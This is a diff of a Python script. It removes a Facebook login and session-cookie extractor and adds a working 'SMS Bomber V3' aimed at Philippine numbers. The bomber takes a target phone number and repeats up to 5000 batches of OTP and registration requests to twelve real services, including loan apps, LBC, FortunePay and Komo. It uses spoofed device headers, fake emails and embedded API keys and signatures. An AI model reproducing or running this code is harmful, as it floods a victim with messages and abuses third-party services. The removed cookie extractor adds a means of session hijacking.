@@ -1,320 +1,427 @@
-#!/usr/bin/env python3
-"""
-Facebook Cookie Extractor for Termux - Enhanced Version
-Usage: python3 fb_login.py
-"""
-
-import random
-import re
-import time
 import requests
-from typing import Dict, Optional, Tuple
+import random
+import string
+import time
 import sys
-import json
+from urllib.parse import urlencode
+from datetime import datetime
+import asyncio
+import aiohttp
 
 class Colors:
-    """ANSI color codes for terminal"""
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    MAGENTA = '\033[95m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
-    END = '\033[0m'
+    RESET = '\033[0m'
+    BRIGHT = '\033[1m'
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN = '\033[36m'
 
-def print_banner():
-    """Display script banner"""
-    banner = f"""
-{Colors.CYAN}{Colors.BOLD}
-╔═══════════════════════════════════════════╗
-║     Facebook Cookie Extractor v3.0        ║
-║         Enhanced Termux Edition           ║
-╚═══════════════════════════════════════════╝
-{Colors.END}
-"""
-    print(banner)
+def color_text(text, color):
+    color_code = getattr(Colors, color.upper(), Colors.RESET)
+    return f"{color_code}{text}{Colors.RESET}"
 
-class FacebookLogin:
-    def __init__(self):
-        self.session = requests.Session()
-        self.session.verify = True
-        
-    def generate_user_agent(self) -> str:
-        """Generate a realistic mobile user agent"""
-        agents = [
-            "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
-        ]
-        return random.choice(agents)
+def random_string(length):
+    chars = string.ascii_lowercase + string.digits
+    return ''.join(random.choice(chars) for _ in range(length))
 
-    def get_initial_cookies(self, user_agent: str) -> bool:
-        """Get initial cookies from Facebook"""
-        try:
-            headers = {
-                'User-Agent': user_agent,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'keep-alive',
-                'Upgrade-Insecure-Requests': '1'
-            }
-            
-            response = self.session.get('https://mbasic.facebook.com/', headers=headers, timeout=15)
-            return response.status_code == 200
-        except:
-            return False
+FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
+FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"
 
-    def extract_form_data(self, html_content: str) -> Dict[str, str]:
-        """Extract form data from login page"""
-        form_data = {}
-        
-        # Extract lsd
-        lsd_match = re.search(r'name="lsd" value="([^"]*)"', html_content)
-        if lsd_match:
-            form_data['lsd'] = lsd_match.group(1)
-        
-        # Extract jazoest
-        jazoest_match = re.search(r'name="jazoest" value="([^"]*)"', html_content)
-        if jazoest_match:
-            form_data['jazoest'] = jazoest_match.group(1)
-        
-        # Extract m_ts
-        m_ts_match = re.search(r'name="m_ts" value="([^"]*)"', html_content)
-        if m_ts_match:
-            form_data['m_ts'] = m_ts_match.group(1)
-        
-        # Extract li
-        li_match = re.search(r'name="li" value="([^"]*)"', html_content)
-        if li_match:
-            form_data['li'] = li_match.group(1)
-        
-        # Extract try_number
-        try_match = re.search(r'name="try_number" value="([^"]*)"', html_content)
-        if try_match:
-            form_data['try_number'] = try_match.group(1)
-        else:
-            form_data['try_number'] = '0'
-        
-        # Extract unrecognized_tries
-        unrec_match = re.search(r'name="unrecognized_tries" value="([^"]*)"', html_content)
-        if unrec_match:
-            form_data['unrecognized_tries'] = unrec_match.group(1)
-        else:
-            form_data['unrecognized_tries'] = '0'
-        
-        return form_data
+def show_banner():
+    banner = """
+ ██████╗ ██████╗ ██████╗ ███████╗    ███████╗███╗   ███╗███████╗
+██╔════╝██╔═══██╗██╔══██╗██╔════╝    ██╔════╝████╗ ████║██╔════╝
+██║     ██║   ██║██║  ██║█████╗      ███████╗██╔████╔██║███████╗
+██║     ██║   ██║██║  ██║██╔══╝      ╚════██║██║╚██╔╝██║╚════██║
+╚██████╗╚██████╔╝██████╔╝███████╗    ███████║██║ ╚═╝ ██║███████║
+ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝    ╚══════╝╚═╝     ╚═╝╚══════╝
+                                                                 
+              ██████╗ ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
+             ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
+             ██║     ██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
+             ██║     ██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
+             ╚██████╗╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
+              ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
+                                                                 
+                       TOOL CREATED BY RIO | SMS BOMBER V3
+    """
+    print(color_text(banner, 'cyan'))
 
-    def attempt_login(self, email: str, password: str) -> Tuple[bool, Dict]:
-        """Main login method using mbasic.facebook.com"""
-        try:
-            print(f"{Colors.YELLOW}[*] Initializing session...{Colors.END}")
-            user_agent = self.generate_user_agent()
-            
-            # Get initial cookies
-            if not self.get_initial_cookies(user_agent):
-                return False, {"error": "Failed to initialize session"}
-            
-            print(f"{Colors.YELLOW}[*] Fetching login page...{Colors.END}")
-            
-            headers = {
-                'User-Agent': user_agent,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Accept-Encoding': 'gzip, deflate',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://mbasic.facebook.com',
-                'Connection': 'keep-alive',
-                'Referer': 'https://mbasic.facebook.com/',
-                'Upgrade-Insecure-Requests': '1'
-            }
-            
-            # Get login page
-            login_page = self.session.get('https://mbasic.facebook.com/login/', headers=headers, timeout=15)
-            
-            if login_page.status_code != 200:
-                return False, {"error": "Failed to load login page"}
-            
-            print(f"{Colors.YELLOW}[*] Extracting form tokens...{Colors.END}")
-            form_data = self.extract_form_data(login_page.text)
-            
-            if not form_data.get('lsd'):
-                return False, {"error": "Failed to extract security tokens"}
-            
-            print(f"{Colors.YELLOW}[*] Submitting login credentials...{Colors.END}")
-            
-            # Prepare login data
-            login_data = {
-                'lsd': form_data.get('lsd', ''),
-                'jazoest': form_data.get('jazoest', ''),
-                'm_ts': form_data.get('m_ts', ''),
-                'li': form_data.get('li', ''),
-                'try_number': form_data.get('try_number', '0'),
-                'unrecognized_tries': form_data.get('unrecognized_tries', '0'),
-                'email': email,
-                'pass': password,
-                'login': 'Log In'
-            }
-            
-            # Submit login
-            login_response = self.session.post(
-                'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
-                data=login_data,
-                headers=headers,
-                allow_redirects=True,
-                timeout=30
-            )
-            
-            print(f"{Colors.YELLOW}[*] Verifying login status...{Colors.END}")
-            
-            # Check cookies
-            cookies = self.session.cookies.get_dict()
-            
-            # Check for successful login
-            if 'c_user' in cookies and cookies['c_user']:
-                print(f"{Colors.YELLOW}[*] Extracting cookies...{Colors.END}")
-                
-                # Get all important cookies
-                important_cookies = {}
-                cookie_keys = ['c_user', 'xs', 'fr', 'datr', 'sb', 'wd', 'spin', 'presence']
-                
-                for key in cookie_keys:
-                    if key in cookies:
-                        important_cookies[key] = cookies[key]
-                
-                # Create cookie string
-                cookie_string = "; ".join([f"{key}={value}" for key, value in important_cookies.items()])
-                uid = cookies.get('c_user', '')
-                
-                return True, {
-                    "success": True,
-                    "cookie": cookie_string,
-                    "uid": uid,
-                    "cookies": important_cookies
-                }
-            
-            # Check for specific errors
-            response_text = login_response.text.lower()
-            
-            if 'checkpoint' in login_response.url or 'checkpoint' in response_text:
-                return False, {"error": "Account has security checkpoint. Please verify your account first."}
-            
-            if 'two_factor' in response_text or 'two-factor' in response_text or 'approvals_code' in response_text:
-                return False, {"error": "Two-factor authentication is enabled. Please disable 2FA."}
-            
-            if 'login_error' in response_text or 'error' in response_text:
-                return False, {"error": "Invalid email or password."}
-            
-            return False, {"error": "Login failed. Please check your credentials."}
-            
-        except requests.exceptions.Timeout:
-            return False, {"error": "Connection timeout. Check your internet."}
-        except requests.exceptions.ConnectionError:
-            return False, {"error": "Network error. Check your connection."}
-        except Exception as e:
-            return False, {"error": f"Unexpected error: {str(e)}"}
-
-def save_cookie_to_file(cookie: str, uid: str):
-    """Save cookie to file"""
+async def send_ezloan(session, number):
+    url = 'https://gateway.ezloancash.ph/security/auth/otp/request'
+    headers = {
+        'User-Agent': 'okhttp/4.9.2',
+        'Accept': 'application/json',
+        'Accept-Encoding': 'gzip',
+        'Content-Type': 'application/json',
+        'accept-language': 'en',
+        'imei': 'e933e51d8c994b05b5a0d523c84f8287',
+        'device': 'android',
+        'buildtype': 'release',
+        'brand': 'POCO',
+        'model': '2207117BPG',
+        'manufacturer': 'Xiaomi',
+        'source': 'EZLOAN',
+        'channel': 'GooglePlay_Blue',
+        'appversion': '2.0.4',
+        'appversioncode': '2000402',
+        'version': '2.0.4',
+        'versioncode': '2000401',
+        'sysversion': '15',
+        'sysversioncode': '35',
+        'customerid': '',
+        'businessid': 'EZLOAN',
+        'phone': '',
+        'appid': 'EZLOAN',
+        'authorization': '',
+        'blackbox': 'qGPG61760445001tnR5bweVKGe',
+        'Cookie': 'sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22199e2b212bc118-0da93596827e478-37661333-343089-199e2b212bd9b%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTk5ZTJiMjEyYmMxMTgtMGRhOTM1OTY4MjdlNDc4LTM3NjYxMzMzLTM0MzA4OS0xOTllMmIyMTJiZDliIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%22199e2b212bc118-0da93596827e478-37661333-343089-199e2b212bd9b%22%7D; _fbp=fb.1.1760444945208.257083461139881056'
+    }
+    data = {
+        "businessId": "EZLOAN",
+        "contactNumber": number,
+        "appsflyerIdentifier": "1760444943092-3966994042140191452"
+    }
     try:
-        filename = f"fb_cookie_{uid}.txt"
-        with open(filename, 'w') as f:
-            f.write(f"═══════════════════════════════════════\n")
-            f.write(f"     Facebook Cookie Extract\n")
-            f.write(f"═══════════════════════════════════════\n\n")
-            f.write(f"User ID: {uid}\n\n")
-            f.write(f"Cookie String:\n")
-            f.write(f"{cookie}\n\n")
-            f.write(f"═══════════════════════════════════════\n")
-            f.write(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write(f"═══════════════════════════════════════\n")
-        return filename
-    except Exception as e:
-        print(f"{Colors.RED}[!] Error saving to file: {str(e)}{Colors.END}")
-        return None
+        async with session.post(url, json=data, headers=headers, timeout=10) as response:
+            print(color_text('   [SENT] EZLOAN', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] EZLOAN', 'red'))
+        return False
 
-def main():
-    """Main function"""
-    print_banner()
+async def send_xpress(session, number, batch):
+    url = 'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp'
+    headers = {
+        'User-Agent': 'Dalvik/2.1.0',
+        'Content-Type': 'application/json'
+    }
+    data = {
+        'FirstName': 'user',
+        'LastName': 'test',
+        'Email': f'user{int(time.time())}_{batch}@gmail.com',
+        'Phone': number,
+        'Password': 'Pass1234',
+        'ConfirmPassword': 'Pass1234',
+        'FingerprintVisitorId': FINGERPRINT_VISITOR_ID,
+        'FingerprintRequestId': FINGERPRINT_REQUEST_ID
+    }
+    try:
+        async with session.post(url, json=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] XPRESS PH', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] XPRESS PH', 'red'))
+        return False
+
+async def send_abenson(session, number):
+    url = 'https://api.mobile.abenson.com/api/public/membership/activate_otp'
+    headers = {
+        'User-Agent': 'okhttp/4.9.0',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = urlencode({'contact_no': number, 'login_token': 'undefined'})
+    try:
+        async with session.post(url, data=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] ABENSON', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] ABENSON', 'red'))
+        return False
+
+async def send_excellent(session, number):
+    coordinates = [
+        {'lat': '14.5995', 'long': '120.9842'},
+        {'lat': '14.6760', 'long': '121.0437'},
+        {'lat': '14.8648', 'long': '121.0418'}
+    ]
+    user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
+    coord = random.choice(coordinates)
+    agent = random.choice(user_agents)
     
+    url = 'https://api.excellenteralending.com/dllin/union/rehabilitation/dock'
+    headers = {
+        'User-Agent': agent,
+        'Content-Type': 'application/json; charset=utf-8',
+        'x-latitude': coord['lat'],
+        'x-longitude': coord['long']
+    }
+    data = {
+        'domain': number,
+        'cat': 'login',
+        'previous': False,
+        'financial': 'efe35521e51f924efcad5d61d61072a9'
+    }
     try:
-        # Get email input
-        print(f"{Colors.CYAN}[?] Enter Facebook Email/Phone/Username:{Colors.END} ", end='')
-        email = input().strip()
+        async with session.post(url, json=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] EXCELLENT LENDING', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] EXCELLENT LENDING', 'red'))
+        return False
+
+async def send_fortune(session, number):
+    url = 'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register'
+    headers = {
+        'User-Agent': 'Dart/3.6 (dart:io)',
+        'Content-Type': 'application/json',
+        'app-type': 'GOOGLE_PLAY',
+        'authorization': 'Bearer',
+        'app-version': '4.3.5',
+        'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
+        'timestamp': str(int(time.time() * 1000)),
+        'nonce': f'{random_string(10)}-{int(time.time() * 1000)}'
+    }
+    data = {
+        'deviceId': 'c31a9bc0-652d-11f0-88cf-9d4076456969',
+        'deviceType': 'GOOGLE_PLAY',
+        'companyId': '4bf735e97269421a80b82359e7dc2288',
+        'dialCode': '+63',
+        'phoneNumber': number.lstrip('0')
+    }
+    try:
+        async with session.post(url, json=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] FORTUNE PAY', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] FORTUNE PAY', 'red'))
+        return False
+
+async def send_wemove(session, number):
+    url = 'https://api.wemove.com.ph/auth/users'
+    headers = {
+        'User-Agent': 'okhttp/4.9.3',
+        'Content-Type': 'application/json',
+        'xuid_type': 'user',
+        'source': 'customer',
+        'authorization': 'Bearer'
+    }
+    data = {
+        'phone_country': '+63',
+        'phone_no': number.lstrip('0')
+    }
+    try:
+        async with session.post(url, json=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] WEMOVE', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] WEMOVE', 'red'))
+        return False
+
+async def send_pinoy_coop(session, number):
+    url = 'https://api.pinoycoop.com/notification/otp'
+    headers = {
+        'User-Agent': 'okhttp/4.9.2',
+        'Content-Type': 'application/json',
+        'authorization': 'Bearer'
+    }
+    data = {
+        'phone': '63' + number.lstrip('0'),
+        'branch_code': '700'
+    }
+    try:
+        async with session.post(url, json=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] PINOY COOP', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] PINOY COOP', 'red'))
+        return False
+
+async def send_lbc(session, number):
+    url = 'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification'
+    headers = {
+        'User-Agent': 'Dart/2.19 (dart:io)',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = urlencode({
+        'verification_type': 'mobile',
+        'client_email': f'{random_string(8)}@gmail.com',
+        'client_contact_code': '+63',
+        'client_contact_no': number.lstrip('0'),
+        'app_log_uid': random_string(16)
+    })
+    try:
+        async with session.post(url, data=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] LBC CONNECT', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] LBC CONNECT', 'red'))
+        return False
+
+async def send_pickup(session, number):
+    url = 'https://production.api.pickup-coffee.net/v2/customers/login'
+    headers = {
+        'User-Agent': random.choice(['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']),
+        'Content-Type': 'application/json'
+    }
+    formatted = number if number.startswith('+63') else ('+63' + number.lstrip('0'))
+    data = {
+        'mobile_number': formatted,
+        'login_method': 'mobile_number'
+    }
+    try:
+        async with session.post(url, json=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] PICKUP COFFEE', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] PICKUP COFFEE', 'red'))
+        return False
+
+async def send_lista(session, number):
+    url = 'https://api-v2.lista.systems/auth/otp/mpin'
+    headers = {
+        'User-Agent': 'okhttp/4.9.2',
+        'Content-Type': 'application/json',
+        'appdevice-brand': 'POCO',
+        'appdevice-buildnumber': '100000619',
+        'appdevice-bundleid': 'com.listaPh',
+        'appdevice-islocationenabled': 'false',
+        'appdevice-manufacturer': 'Xiaomi',
+        'appdevice-readableversion': '3.9.57',
+        'appdevice-modelname': '2207117BPG',
+        'appdevice-uniqueid': random_string(16),
+        'appdevice-os': 'android',
+        'app-version': '3.9.57'
+    }
+    formatted = number if number.startswith('+63') else ('+63' + number.lstrip('0'))
+    data = {'phoneNumber': formatted}
+    try:
+        async with session.post(url, json=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] LISTA SYSTEMS', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] LISTA SYSTEMS', 'red'))
+        return False
+
+async def send_honey(session, number):
+    url = 'https://api.honeyloan.ph/api/client/registration/step-one'
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
+        'Content-Type': 'application/json'
+    }
+    data = {
+        'phone': number,
+        'is_rights_block_accepted': 1
+    }
+    try:
+        async with session.post(url, json=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] HONEY LOAN', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] HONEY LOAN', 'red'))
+        return False
+
+async def send_komo(session, number):
+    url = 'https://api.komo.ph/api/otp/v5/generate'
+    headers = {
+        'Content-Type': 'application/json',
+        'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
+        'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
+    }
+    data = {
+        'mobile': number,
+        'transactionType': 6
+    }
+    try:
+        async with session.post(url, json=data, headers=headers, timeout=8) as response:
+            print(color_text('   [SENT] KOMO PH', 'green'))
+            return True
+    except:
+        print(color_text('   [FAILED] KOMO PH', 'red'))
+        return False
+
+async def send_batch(number, formatted_num, batch):
+    async with aiohttp.ClientSession() as session:
+        tasks = [
+            send_ezloan(session, number),
+            send_xpress(session, formatted_num, batch),
+            send_abenson(session, number),
+            send_excellent(session, number),
+            send_fortune(session, number),
+            send_wemove(session, number),
+            send_pinoy_coop(session, number),
+            send_lbc(session, number),
+            send_pickup(session, formatted_num),
+            send_lista(session, formatted_num),
+            send_honey(session, number),
+            send_komo(session, number)
+        ]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        return sum(1 for r in results if r is True), sum(1 for r in results if r is not True)
+
+async def sms_bomb():
+    try:
+        show_banner()
         
-        if not email:
-            print(f"{Colors.RED}[!] Email cannot be empty!{Colors.END}")
-            sys.exit(1)
+        print(color_text('[INFO] PHONE FORMAT: 09123456789 / 9123456789', 'yellow'))
         
-        # Get password input (visible in Termux)
-        print(f"{Colors.CYAN}[?] Enter your Facebook password:{Colors.END} ", end='')
-        password = input().strip()
+        number_input = input(color_text('[INPUT] ENTER TARGET NUMBER: ', 'blue'))
+        amount_input = input(color_text('[INPUT] ENTER AMOUNT (MAX 5000): ', 'blue'))
         
-        if not password:
-            print(f"{Colors.RED}[!] Password cannot be empty!{Colors.END}")
-            sys.exit(1)
+        clean_number = number_input.replace(' ', '')
         
-        print(f"\n{Colors.BLUE}{'='*50}{Colors.END}")
-        print(f"{Colors.YELLOW}[*] Starting login process...{Colors.END}\n")
+        import re
+        if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', clean_number):
+            print(color_text('[ERROR] INVALID PHONE NUMBER FORMAT!', 'red'))
+            return
         
-        # Create login instance and attempt login
-        fb_login = FacebookLogin()
-        success, result = fb_login.attempt_login(email, password)
+        try:
+            amount = int(amount_input)
+        except:
+            amount = 100
         
-        print(f"\n{Colors.BLUE}{'='*50}{Colors.END}\n")
+        if amount > 5000:
+            print(color_text('[WARNING] AMOUNT SET TO MAX 5000', 'yellow'))
+            amount = 5000
         
-        if success:
-            print(f"{Colors.GREEN}{Colors.BOLD}[✓] LOGIN SUCCESSFUL!{Colors.END}\n")
-            print(f"{Colors.CYAN}╔{'═'*48}╗{Colors.END}")
-            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}User ID:{Colors.END} {result['uid']:<39} {Colors.CYAN}║{Colors.END}")
-            print(f"{Colors.CYAN}╚{'═'*48}╝{Colors.END}\n")
+        if amount < 1:
+            print(color_text('[ERROR] AMOUNT MUST BE AT LEAST 1', 'red'))
+            return
+        
+        number_to_send = clean_number
+        formatted_num = (number_to_send if number_to_send.startswith('+63') else
+                        '+63' + number_to_send[1:] if number_to_send.startswith('09') else
+                        '+63' + number_to_send if number_to_send.startswith('9') else number_to_send)
+        
+        print(color_text('\n[STATUS] STARTING SMS BOMB ATTACK', 'green'))
+        print(color_text(f'[TARGET] {number_to_send}', 'cyan'))
+        print(color_text(f'[AMOUNT] {amount} BATCHES', 'cyan'))
+        print(color_text('[PROCESS] INITIATING...\n', 'yellow'))
+        
+        success_count = 0
+        fail_count = 0
+        
+        for i in range(1, amount + 1):
+            print(color_text(f'[BATCH] {i}/{amount}', 'magenta'))
             
-            print(f"{Colors.CYAN}Full Cookie String:{Colors.END}")
-            print(f"{Colors.WHITE}{result['cookie']}{Colors.END}\n")
+            batch_success, batch_fail = await send_batch(number_to_send, formatted_num, i)
+            success_count += batch_success
+            fail_count += batch_fail
             
-            # Display individual cookies in a nice format
-            print(f"{Colors.CYAN}Individual Cookies:{Colors.END}")
-            print(f"{Colors.BLUE}{'─'*50}{Colors.END}")
-            for key, value in result['cookies'].items():
-                display_value = value[:60] + "..." if len(value) > 60 else value
-                print(f"{Colors.YELLOW}{key:12}{Colors.END} : {display_value}")
-            print(f"{Colors.BLUE}{'─'*50}{Colors.END}\n")
+            print(color_text(f'[STATS] BATCH: {i}/{amount} | SUCCESS: {success_count} | FAILED: {fail_count}', 'cyan'))
             
-            # Ask to save to file
-            print(f"{Colors.CYAN}[?] Save cookie to file? (y/n):{Colors.END} ", end='')
-            save_choice = input().strip().lower()
-            
-            if save_choice == 'y':
-                filename = save_cookie_to_file(result['cookie'], result['uid'])
-                if filename:
-                    print(f"{Colors.GREEN}[✓] Cookie saved to: {filename}{Colors.END}")
-            
-            print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] Success! You can now use this cookie!{Colors.END}\n")
-            
-        else:
-            print(f"{Colors.RED}{Colors.BOLD}[✗] LOGIN FAILED!{Colors.END}\n")
-            print(f"{Colors.RED}Error: {result.get('error', 'Unknown error')}{Colors.END}\n")
-            
-            print(f"{Colors.YELLOW}╔{'═'*48}╗{Colors.END}")
-            print(f"{Colors.YELLOW}║  Troubleshooting Tips{' '*26}║{Colors.END}")
-            print(f"{Colors.YELLOW}╚{'═'*48}╝{Colors.END}")
-            print(f"  {Colors.CYAN}1.{Colors.END} Double-check your email and password")
-            print(f"  {Colors.CYAN}2.{Colors.END} Make sure 2FA is disabled")
-            print(f"  {Colors.CYAN}3.{Colors.END} Try logging in via browser first")
-            print(f"  {Colors.CYAN}4.{Colors.END} Check for account security checkpoints")
-            print(f"  {Colors.CYAN}5.{Colors.END} Use email instead of phone number")
-            print(f"  {Colors.CYAN}6.{Colors.END} Verify your internet connection")
-            print(f"  {Colors.CYAN}7.{Colors.END} Wait a few minutes and try again\n")
-            
+            delay = random.uniform(1, 3)
+            await asyncio.sleep(delay)
+        
+        print(color_text('\n[COMPLETE] SMS BOMB ATTACK FINISHED', 'green'))
+        print(color_text(f'[SUCCESS] {success_count} REQUESTS', 'green'))
+        print(color_text(f'[FAILED] {fail_count} REQUESTS', 'red'))
+        print(color_text(f'[TARGET] {number_to_send}', 'cyan'))
+        print(color_text(f'[BATCHES] {amount}', 'cyan'))
+        print(color_text('\n[CREDITS] TOOL CREATED BY RIO', 'magenta'))
+        
     except KeyboardInterrupt:
-        print(f"\n\n{Colors.YELLOW}[!] Process interrupted by user.{Colors.END}")
+        print(color_text('\n[STOPPED] PROCESS TERMINATED BY USER', 'yellow'))
         sys.exit(0)
     except Exception as e:
-        print(f"\n{Colors.RED}[!] Fatal error: {str(e)}{Colors.END}")
-        sys.exit(1)
+        print(color_text('[ERROR] SYSTEM FAILURE', 'red'))
+        print(color_text(f'[DEBUG] {str(e)}', 'red'))
 
 if __name__ == '__main__':
-    main()
+    try:
+        asyncio.run(sms_bomb())
+    except KeyboardInterrupt:
+        print(color_text('\n[STOPPED] PROCESS TERMINATED BY USER', 'yellow'))
+        sys.exit(0)
